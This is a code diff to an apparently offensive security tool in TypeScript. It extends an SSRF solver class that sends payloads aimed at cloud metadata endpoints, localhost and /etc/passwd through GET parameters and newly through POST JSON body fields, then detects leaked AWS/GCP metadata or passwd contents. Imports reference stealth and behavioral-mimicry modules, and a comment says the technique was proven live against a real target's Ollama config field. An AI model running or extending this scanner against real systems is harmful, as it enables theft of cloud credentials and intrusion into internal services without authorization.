@@ -20,6 +20,7 @@ import type { MimicrySession } from "../lib/stealth/behavioral-mimicry";
 import { dynamicRateLimiter, autoAdjuster } from "../lib/stealth";
 import { huntCortex, SignalType } from "../lib/intelligence/hunt-cortex";
 import { getCsrfHeaders } from "../lib/tools/csrf-aware-request";
+import { SSRF_PARAM_NAMES } from "../lib/tools/ssrf-chain-prober";
 
 const execAsync = promisify(exec);
 const execFileAsync = promisify(execFile);
@@ -348,7 +349,7 @@ class SQLiSolver extends BaseSolver {
   }
 }
 
-class SSRFSolver extends BaseSolver {
+export class SSRFSolver extends BaseSolver {
   private readonly ssrfPayloads = [
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/computeMetadata/v1/",
@@ -361,33 +362,32 @@ class SSRFSolver extends BaseSolver {
     "file:///etc/passwd",
   ];
 
+  // Small, high-signal subset for the POST-body fallback pass — kept short
+  // because it's multiplied against the full param-name list (see solve()),
+  // not because these payloads are weaker than the GET pass's full set.
+  private readonly ssrfPostPayloads = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1:80/",
+  ];
+
+  static detects(body: string): boolean {
+    return body.includes("ami-id") || body.includes("instance-id")
+      || body.includes("computeMetadata") || body.includes("project-id")
+      || /root:.*:0:0:/.test(body);
+  }
+
   async solve(task: SolverTask): Promise<SolverResult> {
     const start = Date.now();
     let found = false;
     let bestPayload = "";
     let bestResp = "";
+    let viaPostBody = false;
 
     for (const payload of this.ssrfPayloads) {
-      for (const param of ["url", "redirect", "next", "goto", "target", "dest", "destination", "rurl", "return"]) {
+      for (const param of SSRF_PARAM_NAMES) {
         const probeUrl = `${task.endpoint}?${param}=${encodeURIComponent(payload)}`;
         const resp = await this.httpProbe(probeUrl);
-
-        // AWS metadata detection
-        if (resp.body.includes("ami-id") || resp.body.includes("instance-id")) {
-          found = true;
-          bestPayload = payload;
-          bestResp = resp.body;
-          break;
-        }
-        // GCP metadata detection
-        if (resp.body.includes("computeMetadata") || resp.body.includes("project-id")) {
-          found = true;
-          bestPayload = payload;
-          bestResp = resp.body;
-          break;
-        }
-        // /etc/passwd detection
-        if (resp.body.match(/root:.*:0:0:/)) {
+        if (SSRFSolver.detects(resp.body)) {
           found = true;
           bestPayload = payload;
           bestResp = resp.body;
@@ -397,6 +397,32 @@ class SSRFSolver extends BaseSolver {
       if (found) break;
     }
 
+    // "Test this connection" / admin-tooling fields (a headless-browser screenshot
+    // target, a local-LLM config panel's host field) almost never arrive as a GET
+    // query param — they're POST JSON body fields. Proven live against a real
+    // target 2026-07-10: an Ollama URL config field was a genuine SSRF sink that
+    // the GET-only pass above would never reach. Only runs when GET found nothing,
+    // and uses a short payload list to keep the combinatorics bounded.
+    if (!found) {
+      for (const param of SSRF_PARAM_NAMES) {
+        let hit = false;
+        for (const payload of this.ssrfPostPayloads) {
+          const resp = await this.httpProbe(
+            task.endpoint, "POST", undefined,
+            { "Content-Type": "application/json" },
+            JSON.stringify({ [param]: payload })
+          );
+          if (SSRFSolver.detects(resp.body)) {
+            found = true; viaPostBody = true;
+            bestPayload = payload; bestResp = resp.body;
+            hit = true;
+            break;
+          }
+        }
+        if (hit) break;
+      }
+    }
+
     return {
       taskId: task.id,
       solverId: `ssrf-solver-${uuidv4().slice(0, 8)}`,
@@ -404,12 +430,20 @@ class SSRFSolver extends BaseSolver {
       vulnClass: "ssrf",
       found,
       confidence: found ? 0.9 : 0.05,
-      evidence: { payloadsTested: this.ssrfPayloads.length },
+      evidence: {
+        payloadsTested: this.ssrfPayloads.length,
+        paramNamesTested: SSRF_PARAM_NAMES.length,
+        viaPostBody,
+      },
       payload: bestPayload,
-      request: bestPayload ? `${task.endpoint}?url=${encodeURIComponent(bestPayload)}` : "",
+      request: bestPayload
+        ? (viaPostBody
+          ? `POST ${task.endpoint} body:{"<field>":"${bestPayload}"}`
+          : `${task.endpoint}?url=${encodeURIComponent(bestPayload)}`)
+        : "",
       response: bestResp.slice(0, 500),
       duration: Date.now() - start,
-      toolsUsed: ["http_probe", "ssrf_payload_library"],
+      toolsUsed: ["http_probe", "ssrf_payload_library", ...(viaPostBody ? ["ssrf_post_body_probe"] : [])],
     };
   }
 }
